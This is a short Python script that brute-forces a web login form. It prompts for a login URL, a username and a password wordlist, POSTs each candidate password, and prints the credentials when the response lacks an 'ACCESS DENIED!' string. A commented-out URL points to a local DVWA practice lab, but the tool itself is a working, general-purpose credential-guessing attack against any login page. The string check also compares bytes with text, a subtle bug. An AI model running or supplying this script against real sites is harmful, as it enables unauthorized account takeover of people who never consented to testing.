import requests
from termcolor import colored

def web_Broute():
    try:
        
        def brouteforce(username,url):
            for password in passwords:
                password = password.strip()
                print (colored("[!] Trying To Crack: " + password, 'red'))
                data_dictionary = {"usr":username,"pwd":password,"Login":"submit"}
                response = requests.post(url,data=data_dictionary)
                
                # response = requests.get(url,data=data_dictionary)
                if "ACCESS DENIED!" in response.content:
                    pass
                else:
                    print (colored("[+] UserName: " + username, 'green'))
                    print (colored("[+] Password: " + password, 'green'))
                    exit()

        #page_url = "http://192.168.1.101/dvwa/login.php"
        page_url = input(colored("[*] Enter Login Page Url: ", 'yellow'))
        username = input(colored("[*] Enter UserName: ", 'yellow'))

        # with open ("password:.txt","r") as passwords
        passwdfile = input(colored("[*] Enter Password File: ", 'yellow'))

        with open(passwdfile, "r") as passwords:
            brouteforce(username,page_url)
            print ("[!] No Password Found")
    except KeyboardInterrupt:
        print(colored("[-]ctrl + c Found..!", 'red'))
    except EOFError:
        print(colored("[-]ctrl + D Found..!", 'red'))
    except FileNotFoundError:
        print(colored("[+] FileNot Found....!"))
